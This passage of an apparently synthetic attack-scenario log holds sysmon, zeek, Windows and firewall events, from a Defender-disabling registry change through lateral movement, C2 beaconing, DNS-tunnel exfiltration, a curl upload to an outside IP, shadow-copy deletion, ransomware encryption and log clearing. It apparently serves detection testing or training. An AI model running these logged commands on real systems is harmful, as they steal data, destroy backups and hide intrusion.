{"source": "sysmon", "EventID": 13, "timestamp": "2026-05-08T02:19:30.000Z", "EventType": "SetValue", "Image": "C:\\\\Windows\\\\System32\\\\reg.exe", "TargetObject": "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\DisableAntiSpyware", "Details": "DWORD (0x00000001)", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "7110", "hostname": "WEBSERVER01"}

# === PHASE 5: LATERAL MOVEMENT (T+1400 to T+1900s) ===
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:23:20.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "DestinationIp": "10.10.1.10", "DestinationPort": "445", "SourceIp": "10.10.2.10", "SourcePort": "50000", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:23:25.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "DestinationIp": "10.10.1.20", "DestinationPort": "445", "SourceIp": "10.10.2.10", "SourcePort": "50001", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:23:30.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "DestinationIp": "10.10.1.30", "DestinationPort": "445", "SourceIp": "10.10.2.10", "SourcePort": "50002", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:23:35.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "DestinationIp": "10.10.1.40", "DestinationPort": "445", "SourceIp": "10.10.2.10", "SourcePort": "50003", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:23:40.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "DestinationIp": "10.10.1.50", "DestinationPort": "445", "SourceIp": "10.10.2.10", "SourcePort": "50004", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:23:45.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "DestinationIp": "10.10.1.60", "DestinationPort": "445", "SourceIp": "10.10.2.10", "SourcePort": "50005", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:23:50.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "DestinationIp": "10.10.1.70", "DestinationPort": "445", "SourceIp": "10.10.2.10", "SourcePort": "50006", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:23:55.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "DestinationIp": "10.10.1.80", "DestinationPort": "445", "SourceIp": "10.10.2.10", "SourcePort": "50007", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:23:20.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "50000", "id.resp_h": "10.10.1.10", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 256, "resp_bytes": 512, "conn_state": "SF", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:23:25.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "50001", "id.resp_h": "10.10.1.20", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 256, "resp_bytes": 512, "conn_state": "SF", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:23:30.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "50002", "id.resp_h": "10.10.1.30", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 256, "resp_bytes": 0, "conn_state": "S1", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:23:35.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "50003", "id.resp_h": "10.10.1.40", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 256, "resp_bytes": 0, "conn_state": "S1", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:23:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "50004", "id.resp_h": "10.10.1.50", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 256, "resp_bytes": 0, "conn_state": "S1", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:23:45.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "50005", "id.resp_h": "10.10.1.60", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 256, "resp_bytes": 0, "conn_state": "S1", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:23:50.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "50006", "id.resp_h": "10.10.1.70", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 256, "resp_bytes": 0, "conn_state": "S1", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:23:55.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "50007", "id.resp_h": "10.10.1.80", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 256, "resp_bytes": 0, "conn_state": "S1", "hostname": "WEBSERVER01"}
{"source": "windows_event", "EventID": 4624, "timestamp": "2026-05-08T02:24:10.000Z", "SubjectUserName": "-", "TargetUserName": "svc_backup", "WorkstationName": "WEBSERVER01", "IpAddress": "10.10.2.10", "LogonType": "3", "AuthenticationPackageName": "NTLM", "hostname": "FILESERVER01"}
{"source": "windows_event", "EventID": 7045, "timestamp": "2026-05-08T02:26:52.000Z", "ServiceName": "PSEXESVC", "ImagePath": "C:\\\\Windows\\\\PSEXESVC.exe", "ServiceType": "user mode service", "StartType": "demand start", "AccountName": "LocalSystem", "hostname": "DBSERVER01"}

# === PHASE 6: PERSISTENCE (T+1900 to T+2200s) ===
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:31:40.000Z", "Image": "C:\\\\Windows\\\\System32\\\\schtasks.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "schtasks /create /sc ONLOGON /tn Microsoft\\\\Windows\\\\SysUpdate", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "7500", "hostname": "WEBSERVER01"}
{"source": "windows_event", "EventID": 4698, "timestamp": "2026-05-08T02:31:41.000Z", "SubjectUserName": "SYSTEM", "TaskName": "\\\\Microsoft\\\\Windows\\\\SysUpdate", "hostname": "WEBSERVER01"}
{"source": "windows_event", "EventID": 7045, "timestamp": "2026-05-08T02:32:20.000Z", "ServiceName": "WinUpdateSvc", "ImagePath": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "ServiceType": "kernel driver", "StartType": "auto start", "hostname": "WEBSERVER01"}

# === PHASE 7: C2 BEACONING + DNS TUNNELING (T+2200 to T+2800s) ===
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:36:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "DestinationIp": "185.220.101.45", "DestinationPort": "443", "SourceIp": "10.10.2.10", "SourcePort": "52000", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8000", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:36:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "52000", "id.resp_h": "185.220.101.45", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 1024, "resp_bytes": 2048, "conn_state": "SF", "duration": 2.1, "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:37:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "DestinationIp": "185.220.101.46", "DestinationPort": "443", "SourceIp": "10.10.2.10", "SourcePort": "52001", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8000", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:37:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "52001", "id.resp_h": "185.220.101.46", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 1024, "resp_bytes": 2048, "conn_state": "SF", "duration": 2.1, "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:38:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "DestinationIp": "185.220.101.45", "DestinationPort": "443", "SourceIp": "10.10.2.10", "SourcePort": "52002", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8000", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:38:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "52002", "id.resp_h": "185.220.101.45", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 1024, "resp_bytes": 2048, "conn_state": "SF", "duration": 2.1, "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:39:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "DestinationIp": "185.220.101.46", "DestinationPort": "443", "SourceIp": "10.10.2.10", "SourcePort": "52003", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8000", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:39:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "52003", "id.resp_h": "185.220.101.46", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 1024, "resp_bytes": 2048, "conn_state": "SF", "duration": 2.1, "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:40:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "DestinationIp": "185.220.101.45", "DestinationPort": "443", "SourceIp": "10.10.2.10", "SourcePort": "52004", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8000", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:40:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "52004", "id.resp_h": "185.220.101.45", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 1024, "resp_bytes": 2048, "conn_state": "SF", "duration": 2.1, "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:41:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "DestinationIp": "185.220.101.46", "DestinationPort": "443", "SourceIp": "10.10.2.10", "SourcePort": "52005", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8000", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:41:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "52005", "id.resp_h": "185.220.101.46", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 1024, "resp_bytes": 2048, "conn_state": "SF", "duration": 2.1, "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:42:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "DestinationIp": "185.220.101.45", "DestinationPort": "443", "SourceIp": "10.10.2.10", "SourcePort": "52006", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8000", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:42:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "52006", "id.resp_h": "185.220.101.45", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 1024, "resp_bytes": 2048, "conn_state": "SF", "duration": 2.1, "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 3, "timestamp": "2026-05-08T02:43:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "DestinationIp": "185.220.101.46", "DestinationPort": "443", "SourceIp": "10.10.2.10", "SourcePort": "52007", "Protocol": "tcp", "Initiated": "true", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8000", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:43:40.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "52007", "id.resp_h": "185.220.101.46", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 1024, "resp_bytes": 2048, "conn_state": "SF", "duration": 2.1, "hostname": "WEBSERVER01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:40:00.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "54000", "id.resp_h": "10.10.0.1", "id.resp_p": "53", "query": "c29tZXNlY3JldGRhdGFjaHVuazE.tunnel.c2exfil.ru", "qtype_name": "TXT", "answers": ["v=spf1 include:attacker.ru ~all"], "hostname": "WEBSERVER01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:40:30.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "54001", "id.resp_h": "10.10.0.1", "id.resp_p": "53", "query": "YWRtaW5wYXNzd29yZGhhc2hlcw.tunnel.c2exfil.ru", "qtype_name": "TXT", "answers": ["v=spf1 include:attacker.ru ~all"], "hostname": "WEBSERVER01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:41:00.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "54002", "id.resp_h": "10.10.0.1", "id.resp_p": "53", "query": "ZG9tYWluY29udHJvbGxlcmluZm8.tunnel.c2exfil.ru", "qtype_name": "TXT", "answers": ["v=spf1 include:attacker.ru ~all"], "hostname": "WEBSERVER01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:41:30.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "54003", "id.resp_h": "10.10.0.1", "id.resp_p": "53", "query": "a2VyYmVyb3N0aWNrZXRkYXRhYQ.tunnel.c2exfil.ru", "qtype_name": "TXT", "answers": ["v=spf1 include:attacker.ru ~all"], "hostname": "WEBSERVER01"}

# === PHASE 8: DATA STAGING (T+2800 to T+3200s) ===
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:47:20.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\7z.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "7z.exe a -p infected123 C:\\\\Windows\\\\Temp\\\\data.zip", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8200", "hostname": "FILESERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:48:20.000Z", "id.orig_h": "10.10.1.10", "id.orig_p": "56000", "id.resp_h": "10.10.2.10", "id.resp_p": "445", "proto": "tcp", "service": "smb", "orig_bytes": 104857600, "resp_bytes": 1024, "conn_state": "SF", "duration": 45.2, "hostname": "FILESERVER01"}

# === PHASE 9: DATA EXFILTRATION (T+3200 to T+3600s) ===
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:53:20.000Z", "Image": "C:\\\\Windows\\\\System32\\\\curl.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "curl.exe -X POST https://185.220.101.45:8443/upload", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8400", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:53:21.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "57000", "id.resp_h": "185.220.101.45", "id.resp_p": "8443", "proto": "tcp", "service": "ssl", "orig_bytes": 104857600, "resp_bytes": 512, "conn_state": "SF", "duration": 87.3, "hostname": "WEBSERVER01"}
{"source": "firewall", "timestamp": "2026-05-08T02:53:21.000Z", "action": "ALLOW", "src_ip": "10.10.2.10", "dst_ip": "185.220.101.45", "src_port": "57000", "dst_port": "8443", "protocol": "TCP", "bytes_sent": "104857600", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "ALLOW_OUTBOUND_WEB"}

# === PHASE 10: RANSOMWARE PRECURSOR (T+3600 to T+3900s) ===
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T03:00:00.000Z", "Image": "C:\\\\Windows\\\\System32\\\\vssadmin.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "8600", "hostname": "FILESERVER01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T03:01:40.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\crypt0r.exe", "ParentImage": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "CommandLine": "crypt0r.exe --encrypt --target C:\\\\ D:\\\\ E:\\\\", "User": "NT AUTHORITY\\\\SYSTEM", "IntegrityLevel": "System", "ProcessId": "9000", "hostname": "FILESERVER01"}

# === PHASE 11: COVERING TRACKS (T+3900 to T+4200s) ===
{"source": "windows_event", "EventID": 1102, "timestamp": "2026-05-08T03:05:00.000Z", "SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY", "SubjectLogonId": "0x3E7", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T03:05:20.000Z", "Image": "C:\\\\Windows\\\\System32\\\\wevtutil.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "wevtutil.exe cl Security", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "9100", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T03:05:50.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "cmd.exe /c del /f /q C:\\\\Windows\\\\Temp\\\\m64.exe", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "9200", "hostname": "WEBSERVER01"}

# === END OF SCENARIO LOG ===